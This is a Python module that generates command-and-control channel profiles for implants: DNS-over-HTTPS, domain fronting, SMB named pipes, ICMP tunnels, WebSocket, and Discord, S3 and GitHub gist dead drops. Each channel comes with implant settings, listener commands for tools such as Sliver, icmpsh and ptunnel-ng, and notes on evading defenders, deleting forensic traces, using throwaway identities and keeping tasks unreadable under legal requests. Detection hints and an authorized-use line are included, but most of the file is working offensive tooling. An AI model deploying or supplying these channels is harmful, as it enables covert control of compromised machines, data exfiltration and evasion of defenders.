"""
Modern C2 channel profile generator.

Distinct from generators/c2profile.py (which generates malleable profiles for
Havoc/CS/Sliver/Mythic over HTTPS). This module covers *alternative transports*:
DNS-over-HTTPS, domain fronting, named pipe, ICMP, WebSocket, and cloud-storage
blending (Discord webhooks, S3 task queues, GitHub gists).

Each channel returns:
  - implant_config: text the operator pastes into their implant builder
  - listener_setup: how the operator stands up the matching listener
  - detections: what the blue team would look for
  - techniques, risk, notes: standard metadata

For authorized use on systems you own or have explicit written permission to test.
"""
from dataclasses import dataclass, field

SUPPORTED_CHANNELS = (
    "doh_c2",
    "domain_fronting",
    "named_pipe_c2",
    "icmp_tunnel",
    "websocket_c2",
    "cloud_blend_discord",
    "cloud_blend_s3",
    "cloud_blend_github",
)


@dataclass
class C2ChannelResult:
    channel: str
    implant_config: str
    listener_setup: str
    notes: str
    techniques: list[str] = field(default_factory=list)
    risk: str = "HIGH"
    detections: list[str] = field(default_factory=list)


# ── Channel generators ────────────────────────────────────────────────────────

def _doh_c2(lhost: str, lport: int, options: dict) -> C2ChannelResult:
    doh_providers = {
        "cloudflare": "https://cloudflare-dns.com/dns-query",
        "google": "https://dns.google/dns-query",
        "quad9": "https://dns.quad9.net/dns-query",
        "operator": "https://" + lhost + "/dns-query",
    }
    provider = options.get("doh_provider", "cloudflare")
    doh_url = doh_providers.get(provider, doh_providers["cloudflare"])
    c2_domain = options.get("c2_domain", "beacon.example.com")
    lport_s = str(lport)

    implant = (
        "# DNS-over-HTTPS C2 implant pseudo-config\n"
        "transport         = doh\n"
        "doh_url           = " + doh_url + "\n"
        "c2_domain         = " + c2_domain + "  # operator-controlled authoritative NS\n"
        "poll_interval_s   = 15\n"
        "jitter_pct        = 25\n"
        "max_record_bytes  = 220   # below the 255-byte TXT label cap\n"
        "label_max_bytes   = 60    # below the 63-byte DNS label cap\n"
        "encoding          = base32_no_pad\n"
        "compression       = lz4\n"
        "\n"
        "# Beacon -> C2: encode task-id + chunk into subdomain labels of c2_domain\n"
        "#               POST to doh_url, Content-Type: application/dns-message\n"
        "# C2 -> Beacon: reply carries commands in TXT records — base32-encoded\n"
    )

    listener = (
        "# DNS-over-HTTPS listener\n"
        "\n"
        "# Option 1 — Sliver (built-in DoH support):\n"
        "#   sliver > generate --dns " + c2_domain + " --os windows --arch amd64 --evasion --save impl.exe\n"
        "#   sliver > dns --domains " + c2_domain + "\n"
        "\n"
        "# Option 2 — dnscat2-over-DoH (custom fork):\n"
        "#   ruby dnscat2.rb --doh --secret=changeme " + c2_domain + "\n"
        "\n"
        "# Option 3 — operator's authoritative NS on " + lhost + ":" + lport_s + "\n"
        "#   Run BIND / PowerDNS authoritative for " + c2_domain + "\n"
        "#   Ensure port 443 TLS proxy forwards to port " + lport_s + " internally\n"
    )

    notes = (
        "DoH wraps DNS queries in HTTPS, bypassing corporate DNS inspection. "
        "The beacon encodes beaconing data as subdomain labels (max 63 bytes each). "
        "Responses arrive in TXT records. Exfiltration rate is limited by DNS TTL "
        "and record-size caps (~220 bytes/query). Best for slow, stealthy channels. "
        "Pair with a legitimate-looking registrar domain to survive threat intel."
    )

    return C2ChannelResult(
        channel="doh_c2",
        implant_config=implant,
        listener_setup=listener,
        notes=notes,
        techniques=["T1071.004 - Application Layer Protocol: DNS",
                    "T1132.001 - Data Encoding: Standard Encoding",
                    "T1573.001 - Encrypted Channel: Symmetric Cryptography"],
        risk="HIGH",
        detections=[
            "Anomalous DoH query volume from non-browser process",
            "DoH POST requests to non-standard resolvers",
            "TXT record responses larger than 100 bytes",
            "Subdomain label entropy significantly above baseline",
        ],
    )


def _domain_fronting(lhost: str, lport: int, options: dict) -> C2ChannelResult:
    cdn_host = options.get("cdn_host", "allowed-cdn.example.com")
    real_host = options.get("real_host", lhost)
    front_path = options.get("front_path", "/api/v1/update")
    lport_s = str(lport)

    implant = (
        "# Domain-fronting C2 implant pseudo-config\n"
        "transport         = https\n"
        "connect_host      = " + cdn_host + "  # SNI + TCP target (the CDN front)\n"
        "host_header       = " + real_host + "  # Host: header routes inside CDN\n"
        "uri               = " + front_path + "\n"
        "tls_verify        = true\n"
        "user_agent        = Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n"
        "poll_interval_s   = 30\n"
        "jitter_pct        = 20\n"
        "\n"
        "# The TLS SNI + TCP connection goes to " + cdn_host + "\n"
        "# The HTTP Host header routes to " + real_host + " inside the CDN overlay\n"
        "# CDN must serve both domains (e.g. CloudFront, Cloudflare Workers)\n"
    )

    listener = (
        "# Domain-fronting listener — nginx on " + real_host + ":" + lport_s + "\n"
        "\n"
        "server {\n"
        "    listen " + lport_s + " ssl;\n"
        "    server_name " + real_host + ";\n"
        "    ssl_certificate     /etc/ssl/certs/" + real_host + ".crt;\n"
        "    ssl_certificate_key /etc/ssl/private/" + real_host + ".key;\n"
        "\n"
        "    location " + front_path + " {\n"
        "        proxy_pass http://127.0.0.1:8080;  # local C2 listener\n"
        "        proxy_set_header Host $host;\n"
        "        proxy_set_header X-Real-IP $remote_addr;\n"
        "    }\n"
        "}\n"
        "\n"
        "# CDN setup:\n"
        "#   - Add " + cdn_host + " as an alternate origin for " + real_host + "\n"
        "#   - Disable Host-header normalization (or use a CDN Worker to rewrite)\n"
        "#   - CloudFront: create Distribution with 'Alternate Domain Name' = " + cdn_host + "\n"
    )

    notes = (
        "Domain fronting routes HTTPS traffic through a high-reputation CDN. "
        "Network firewalls see connections to '" + cdn_host + "' only; "
        "the HTTP Host header inside TLS routes to the real C2. "
        "Many CDNs have closed this technique; verify your CDN still allows "
        "mismatched SNI/Host before relying on it. Cloudflare Workers can "
        "replicate the effect using fetch() with custom Host headers."
    )

    return C2ChannelResult(
        channel="domain_fronting",
        implant_config=implant,
        listener_setup=listener,
        notes=notes,
        techniques=["T1090.004 - Proxy: Domain Fronting",
                    "T1071.001 - Application Layer Protocol: Web Protocols",
                    "T1573.002 - Encrypted Channel: Asymmetric Cryptography"],
        risk="HIGH",
        detections=[
            "SNI/Host header mismatch in TLS inspection logs",
            "High-value CDN domains with abnormal POST frequency",
            "Connections to CDN egress IPs from non-browser processes",
        ],
    )


def _named_pipe_c2(lhost: str, lport: int, options: dict) -> C2ChannelResult:
    pipe_name = options.get("pipe_name", "mojo.5688.8052.183894939787088877")
    auth_user = options.get("auth_user", "NT AUTHORITY\\SYSTEM")

    implant = (
        "# Named-pipe C2 implant pseudo-config\n"
        "transport         = smb_pipe\n"
        "pipe_name         = \\\\\\\\.\\\\pipe\\\\" + pipe_name + "\n"
        "auth_mode         = impersonate  # impersonate token of connecting client\n"
        "max_connections   = 5\n"
        "poll_interval_ms  = 500\n"
        "jitter_ms         = 200\n"
        "\n"
        "# For lateral movement: connect peer beacon via SMB pipe to pivot host\n"
        "pivot_target      = " + lhost + "\n"
        "smb_pipe_remote   = \\\\\\\\" + lhost + "\\\\pipe\\\\" + pipe_name + "\n"
        "\n"
        "# Credentials for remote pipe connection (leave blank if using token):\n"
        "smb_user          = " + auth_user + "\n"
        "smb_pass          =   # populate or use token impersonation\n"
    )

    listener = (
        "# Named-pipe C2 listener — C# SMB pipe server skeleton\n"
        "\n"
        "// C# skeleton — paste into your C2 implant framework:\n"
        "var pipeSrv = new NamedPipeServerStream(\n"
        "    \"" + pipe_name + "\",\n"
        "    PipeDirection.InOut,\n"
        "    5,                          // max simultaneous connections\n"
        "    PipeTransmissionMode.Byte,\n"
        "    PipeOptions.Asynchronous);\n"
        "\n"
        "await pipeSrv.WaitForConnectionAsync();\n"
        "// Exchange AES-256-GCM session key, then relay tasks/responses.\n"
        "\n"
        "# Cobalt Strike example:\n"
        "#   beacon> link " + lhost + " " + pipe_name + "\n"
        "\n"
        "# Sliver example:\n"
        "#   sliver > generate --os windows --arch amd64 --format exe\n"
        "#             --name smb_pivot --canary " + pipe_name + "\n"
    )

    notes = (
        "Named pipes travel over SMB (port 445) which is commonly allowed "
        "laterally between Windows hosts inside a domain. The pipe name should "
        "mimic a legitimate Windows service (Chromium mojo pipes, svchost, etc). "
        "Combine with token impersonation to inherit the connected user's context. "
        "Avoid pipe names listed in public C2 detections (msagent_*, postex_*)."
    )

    return C2ChannelResult(
        channel="named_pipe_c2",
        implant_config=implant,
        listener_setup=listener,
        notes=notes,
        techniques=["T1021.002 - Remote Services: SMB/Windows Admin Shares",
                    "T1559.001 - Inter-Process Communication: Component Object Model",
                    "T1570 - Lateral Tool Transfer"],
        risk="MEDIUM",
        detections=[
            "Named pipe creation by non-system process with unusual name",
            "Pipe name matching known implant patterns (postex_, msagent_)",
            "Cross-host pipe connections on port 445 with no corresponding file share",
            "Process connecting to pipe with mismatched parent-process lineage",
        ],
    )


def _icmp_tunnel(lhost: str, lport: int, options: dict) -> C2ChannelResult:
    # lport is advisory for the tunneled TCP session inside ICMP
    tunnel_mode = options.get("icmp_mode", "echo_reply")
    mtu = str(options.get("icmp_mtu", 1400))
    lport_s = str(lport)

    implant = (
        "# ICMP tunnel C2 implant pseudo-config\n"
        "transport         = icmp\n"
        "icmp_type         = " + tunnel_mode + "   # echo (type 8) or echo_reply (type 0)\n"
        "server_ip         = " + lhost + "\n"
        "tunnel_port       = " + lport_s + "  # TCP port muxed inside ICMP payload\n"
        "payload_mtu       = " + mtu + "  # bytes per ICMP frame\n"
        "sequence_encode   = xor_rolling\n"
        "poll_interval_ms  = 800\n"
        "jitter_pct        = 30\n"
        "\n"
        "# Encoded TCP stream fragments are placed in ICMP data field.\n"
        "# Each ping carries up to " + mtu + " bytes of tunneled data.\n"
        "# Server reassembles by ICMP identifier + sequence number.\n"
    )

    listener = (
        "# ICMP tunnel listener\n"
        "\n"
        "# Option 1 — ptunnel-ng (requires root on server):\n"
        "#   sudo ptunnel-ng -r " + lhost + " -rp " + lport_s + " -lp " + lport_s + "\n"
        "#   # then client: sudo ptunnel-ng -p " + lhost + " -lp 2222 -da 127.0.0.1 -dp " + lport_s + "\n"
        "\n"
        "# Option 2 — icmpsh (Windows implant, Python server):\n"
        "#   # server: sudo python icmpsh_m.py " + lhost + " <victim_ip>\n"
        "#   # implant: icmpsh.exe -t " + lhost + " -d 500 -b 30 -s 128\n"
        "\n"
        "# Option 3 — Hans (ICMP-over-TUN, Linux):\n"
        "#   sudo hans -s 10.0.0.0 -p changeme   # server\n"
        "#   sudo hans -c " + lhost + " -p changeme          # client\n"
        "#   # Creates TUN interface; route C2 traffic over 10.0.0.x\n"
    )

    notes = (
        "ICMP tunnels encapsulate TCP/data inside ping packets, bypassing "
        "stateful firewalls that permit ICMP. Requires raw socket privileges "
        "(CAP_NET_RAW on Linux, Administrator on Windows). Throughput is low "
        "(typically <100 KB/s) and packet loss handling adds latency. "
        "Works best in environments where ICMP is unrestricted but TCP egress "
        "is filtered. High ICMP rates are easily flagged — keep poll intervals slow."
    )

    return C2ChannelResult(
        channel="icmp_tunnel",
        implant_config=implant,
        listener_setup=listener,
        notes=notes,
        techniques=["T1095 - Non-Application Layer Protocol",
                    "T1572 - Protocol Tunneling"],
        risk="HIGH",
        detections=[
            "ICMP echo payloads larger than 64 bytes (OS default)",
            "High-frequency ICMP from a single host to a single external IP",
            "Non-zero ICMP data field with encoded structure",
            "Raw socket access by non-system process",
        ],
    )


def _websocket_c2(lhost: str, lport: int, options: dict) -> C2ChannelResult:
    ws_path = options.get("ws_path", "/socket.io/")
    origin = options.get("origin", "https://cdn.jsdelivr.net")
    lport_s = str(lport)
    scheme = "wss" if lport in (443, 8443) else "ws"

    implant = (
        "# WebSocket C2 implant pseudo-config\n"
        "transport         = websocket\n"
        "uri               = " + scheme + "://" + lhost + ":" + lport_s + ws_path + "\n"
        "origin            = " + origin + "\n"
        "subprotocol       = chat      # mimic legitimate WS application\n"
        "heartbeat_s       = 25        # keep-alive ping below proxy timeout (30 s)\n"
        "jitter_pct        = 15\n"
        "tls_verify        = true\n"
        "user_agent        = Mozilla/5.0 (Windows NT 10.0; Win64; x64)\n"
        "\n"
        "# Task frames: JSON envelope {\"id\": uuid, \"t\": base64(cmd)}\n"
        "# Result frames: JSON envelope {\"id\": uuid, \"r\": base64(output)}\n"
        "# AES-256-GCM per frame, key exchanged via ECDH on connect\n"
    )

    listener = (
        "# WebSocket C2 listener\n"
        "\n"
        "# Option 1 — Python asyncio server (simple):\n"
        "# pip install websockets\n"
        "# python3 ws_listener.py --host " + lhost + " --port " + lport_s + " --path " + ws_path + "\n"
        "\n"
        "# ws_listener.py skeleton:\n"
        "# async def handler(ws):\n"
        "#     async for msg in ws:\n"
        "#         task = get_next_task(ws.remote_address)\n"
        "#         if task: await ws.send(json.dumps(task))\n"
        "\n"
        "# Option 2 — Sliver WireGuard+WS listener:\n"
        "#   sliver > wg-listener --host " + lhost + " --port " + lport_s + "\n"
        "\n"
        "# Option 3 — Nginx WS reverse proxy:\n"
        "# location " + ws_path + " {\n"
        "#     proxy_pass http://127.0.0.1:8080;\n"
        "#     proxy_http_version 1.1;\n"
        "#     proxy_set_header Upgrade $http_upgrade;\n"
        "#     proxy_set_header Connection \"upgrade\";\n"
        "# }\n"
    )

    notes = (
        "WebSocket connections are persistent, full-duplex HTTP upgrades that "
        "traverse most corporate proxies. The long-lived connection reduces beacon "
        "frequency artifacts. Use a subprotocol that matches a known webapp "
        "(socket.io, stomp, graphql-ws) to blend with legitimate traffic. "
        "Set Origin to a trusted domain to bypass same-origin checks in proxies. "
        "TLS is mandatory in production — self-signed certs trigger HSTS warnings."
    )

    return C2ChannelResult(
        channel="websocket_c2",
        implant_config=implant,
        listener_setup=listener,
        notes=notes,
        techniques=["T1071.001 - Application Layer Protocol: Web Protocols",
                    "T1573.002 - Encrypted Channel: Asymmetric Cryptography",
                    "T1102 - Web Service"],
        risk="HIGH",
        detections=[
            "Long-lived WebSocket connections from non-browser processes",
            "WebSocket traffic with regular frame-timing intervals (heartbeat)",
            "HTTP Upgrade headers from unusual parent processes",
            "WS subprotocol mismatch with the served application type",
        ],
    )


def _cloud_blend_discord(lhost: str, lport: int, options: dict) -> C2ChannelResult:
    # lhost/lport are for the local relay that bridges Discord -> implant
    guild_id = options.get("guild_id", "000000000000000000")
    channel_id = options.get("channel_id", "111111111111111111")
    bot_prefix = options.get("bot_prefix", "!cmd")

    implant = (
        "# Discord webhook / bot C2 implant pseudo-config\n"
        "transport         = discord_api\n"
        "api_base          = https://discord.com/api/v10\n"
        "bot_token_env     = DISCORD_BOT_TOKEN  # never hardcode — load from env\n"
        "guild_id          = " + guild_id + "\n"
        "task_channel      = " + channel_id + "\n"
        "cmd_prefix        = " + bot_prefix + "\n"
        "poll_interval_s   = 10\n"
        "jitter_pct        = 40\n"
        "\n"
        "# Implant polls task_channel for messages matching cmd_prefix.\n"
        "# Output posted back as a message or uploaded as a file attachment.\n"
        "# Use message IDs as task handles; edit original message to mark done.\n"
        "# AES-encrypt payload before posting; key exchanged out-of-band.\n"
    )

    listener = (
        "# Discord C2 operator console\n"
        "\n"
        "# 1. Create a Discord application + bot at discord.com/developers\n"
        "# 2. Invite bot to a private guild (server) you control\n"
        "# 3. Create dedicated channels: #tasks, #results, #heartbeat\n"
        "# 4. Export DISCORD_BOT_TOKEN in your operator environment\n"
        "\n"
        "# Python operator CLI skeleton:\n"
        "# import discord, asyncio\n"
        "# client = discord.Client(intents=discord.Intents.default())\n"
        "# await client.get_channel(" + channel_id + ").send(\"" + bot_prefix + " whoami\")\n"
        "\n"
        "# Relay server on " + lhost + " (optional — for non-interactive beacons):\n"
        "# python3 discord_relay.py --token $DISCORD_BOT_TOKEN\\\n"
        "#   --guild " + guild_id + " --channel " + channel_id + "\n"
    )

    notes = (
        "Discord's HTTPS API is allowed in most enterprises. Bot tokens provide "
        "authenticated read/write to a private guild channel. Blends with "
        "legitimate Discord traffic on the wire. Rate limits (~50 msg/s) are "
        "sufficient for interactive sessions. Never embed the bot token in the "
        "implant binary — load it from environment or derive it from a seed "
        "computed at runtime. Rotate the token after each engagement."
    )

    return C2ChannelResult(
        channel="cloud_blend_discord",
        implant_config=implant,
        listener_setup=listener,
        notes=notes,
        techniques=["T1102.002 - Web Service: Bidirectional Communication",
                    "T1071.001 - Application Layer Protocol: Web Protocols",
                    "T1567 - Exfiltration Over Web Service"],
        risk="MEDIUM",
        detections=[
            "Discord API calls from non-browser / non-application processes",
            "DISCORD_BOT_TOKEN environment variable in child process",
            "Regular Discord polling intervals from a single host",
            "Message content encoding anomalies (base64 or encrypted blobs)",
        ],
    )


def _cloud_blend_s3(lhost: str, lport: int, options: dict) -> C2ChannelResult:
    bucket = options.get("bucket", "operator-assets-" + lhost.replace(".", "-"))
    region = options.get("region", "us-east-1")
    task_prefix = options.get("task_prefix", "tasks/")
    result_prefix = options.get("result_prefix", "results/")

    implant = (
        "# S3 task-queue C2 implant pseudo-config\n"
        "transport         = s3_poll\n"
        "bucket            = " + bucket + "\n"
        "region            = " + region + "\n"
        "task_prefix       = " + task_prefix + "\n"
        "result_prefix     = " + result_prefix + "\n"
        "credential_env    = AWS_ACCESS_KEY_ID,AWS_SECRET_ACCESS_KEY  # load from env\n"
        "poll_interval_s   = 20\n"
        "jitter_pct        = 35\n"
        "encryption        = aws:sse-c   # client-side AES-256 key known only to operator\n"
        "\n"
        "# Protocol:\n"
        "#   Implant: s3.get_object(Bucket=bucket, Prefix=task_prefix+implant_id)\n"
        "#   Execute task, delete task object, put result to result_prefix+task_id\n"
        "#   Operator polls result_prefix to collect output.\n"
    )

    listener = (
        "# S3 C2 operator side — AWS CLI + Python\n"
        "\n"
        "# Create bucket (do this before the engagement):\n"
        "#   aws s3 mb s3://" + bucket + " --region " + region + "\n"
        "#   aws s3api put-bucket-acl --bucket " + bucket + " --acl private\n"
        "\n"
        "# Push a task for implant ID 'abc123':\n"
        "#   echo 'whoami' | openssl enc -aes-256-cbc -k $C2_KEY -pbkdf2 \\\n"
        "#     | aws s3 cp - s3://" + bucket + "/" + task_prefix + "abc123/task_001\n"
        "\n"
        "# Collect results:\n"
        "#   aws s3 cp s3://" + bucket + "/" + result_prefix + "task_001 - \\\n"
        "#     | openssl enc -d -aes-256-cbc -k $C2_KEY -pbkdf2\n"
        "\n"
        "# Lambda auto-cleaner (optional): delete task/result objects older than 1 hour\n"
        "# to reduce forensic footprint in the bucket.\n"
    )

    notes = (
        "S3 as a dead-drop task queue uses AWS infrastructure that is almost "
        "universally trusted by firewalls. There is no persistent outbound "
        "connection — the implant makes short HTTPS GET/PUT calls to s3.amazonaws.com. "
        "Use client-side encryption (SSE-C) so AWS cannot read task content even "
        "under a legal request. Rotate IAM credentials per-engagement. "
        "Consider using a separate AWS account and deleting it post-engagement."
    )

    return C2ChannelResult(
        channel="cloud_blend_s3",
        implant_config=implant,
        listener_setup=listener,
        notes=notes,
        techniques=["T1102 - Web Service",
                    "T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage",
                    "T1105 - Ingress Tool Transfer"],
        risk="MEDIUM",
        detections=[
            "AWS S3 API calls from non-cloud-aware applications",
            "Regular S3 GET/PUT polling pattern (fixed interval)",
            "AWS credentials in process environment from unusual parent",
            "S3 bucket name not matching corporate naming conventions",
        ],
    )


def _cloud_blend_github(lhost: str, lport: int, options: dict) -> C2ChannelResult:
    repo_owner = options.get("repo_owner", "operator-org")
    repo_name = options.get("repo_name", "config-templates")
    issue_label = options.get("issue_label", "enhancement")
    gist_desc = options.get("gist_desc", "operator-notes")

    implant = (
        "# GitHub gist / issue C2 implant pseudo-config\n"
        "transport         = github_api\n"
        "api_base          = https://api.github.com\n"
        "token_env         = GITHUB_TOKEN  # PAT with gist + repo scope; load from env\n"
        "mode              = gist          # 'gist' (stealthy) or 'issue' (noisier)\n"
        "\n"
        "# Gist mode:\n"
        "gist_description  = " + gist_desc + "\n"
        "gist_filename     = config.json\n"
        "poll_interval_s   = 30\n"
        "jitter_pct        = 45\n"
        "\n"
        "# Issue mode:\n"
        "repo              = " + repo_owner + "/" + repo_name + "\n"
        "task_label        = " + issue_label + "\n"
        "\n"
        "# Protocol (gist): operator updates gist content with AES-encrypted task;\n"
        "#   implant polls gist, decrypts, executes, appends encrypted result.\n"
    )

    listener = (
        "# GitHub C2 operator side\n"
        "\n"
        "# Create a gist (one per implant, private):\n"
        "#   curl -X POST https://api.github.com/gists \\\n"
        "#     -H 'Authorization: Bearer $GITHUB_TOKEN' \\\n"
        "#     -d '{\"description\":\"" + gist_desc + "\",\"public\":false,\n"
        "#           \"files\":{\"config.json\":{\"content\":\"{}\"}}'\n"
        "\n"
        "# Push task (update gist with AES-encrypted JSON):\n"
        "#   curl -X PATCH https://api.github.com/gists/<gist_id> \\\n"
        "#     -H 'Authorization: Bearer $GITHUB_TOKEN' \\\n"
        "#     -d '{\"files\":{\"config.json\":{\"content\":\"<base64(enc_task)>\"}}'\n"
        "\n"
        "# Read result (implant appends to gist content as a new field)\n"
        "#   curl https://api.github.com/gists/<gist_id> \\\n"
        "#     -H 'Authorization: Bearer $GITHUB_TOKEN' | jq .files\n"
        "\n"
        "# Issue mode alternative:\n"
        "#   Operator creates issue with label '" + issue_label + "'; body = base64 task.\n"
        "#   Implant uses GET /repos/" + repo_owner + "/" + repo_name + "/issues?labels=" + issue_label + "\n"
    )

    notes = (
        "GitHub API traffic is TLS-encrypted and allowed by most proxies. "
        "Private gists are not indexed by search engines. Use a throwaway "
        "GitHub account; never link it to your real identity. "
        "Rate limit is 5000 req/hour for authenticated tokens — ample for "
        "interactive sessions. Rotate the Personal Access Token after each "
        "engagement and delete the gist/repository immediately post-op. "
        "GitHub issue notifications may alert repository watchers — prefer gists."
    )

    return C2ChannelResult(
        channel="cloud_blend_github",
        implant_config=implant,
        listener_setup=listener,
        notes=notes,
        techniques=["T1102 - Web Service",
                    "T1567.001 - Exfiltration Over Web Service: Exfiltration to Code Repository",
                    "T1105 - Ingress Tool Transfer"],
        risk="MEDIUM",
        detections=[
            "GitHub API calls from non-developer / non-IDE processes",
            "GITHUB_TOKEN in process environment outside CI pipeline",
            "Regular polling of /gists or /issues endpoints",
            "Gist content with high entropy or non-JSON structure",
        ],
    )


# ── Dispatcher ────────────────────────────────────────────────────────────────

_CHANNEL_DISPATCH = {
    "doh_c2":             _doh_c2,
    "domain_fronting":    _domain_fronting,
    "named_pipe_c2":      _named_pipe_c2,
    "icmp_tunnel":        _icmp_tunnel,
    "websocket_c2":       _websocket_c2,
    "cloud_blend_discord": _cloud_blend_discord,
    "cloud_blend_s3":     _cloud_blend_s3,
    "cloud_blend_github": _cloud_blend_github,
}


def generate_channel(
    channel: str,
    lhost: str,
    lport: int,
    options: dict | None = None,
) -> C2ChannelResult:
    """
    Public API. Dispatches to the appropriate channel generator.

    Args:
        channel:  One of SUPPORTED_CHANNELS.
        lhost:    Operator listener IP or hostname (used for listener configs).
        lport:    Operator listener port.
        options:  Channel-specific options dict (see individual generator docs).

    Returns:
        C2ChannelResult with implant_config, listener_setup, detections, etc.
    """
    if channel not in _CHANNEL_DISPATCH:
        raise ValueError(
            "Unsupported channel '" + channel + "'. "
            "Supported: " + ", ".join(SUPPORTED_CHANNELS)
        )
    return _CHANNEL_DISPATCH[channel](lhost, lport, options or {})
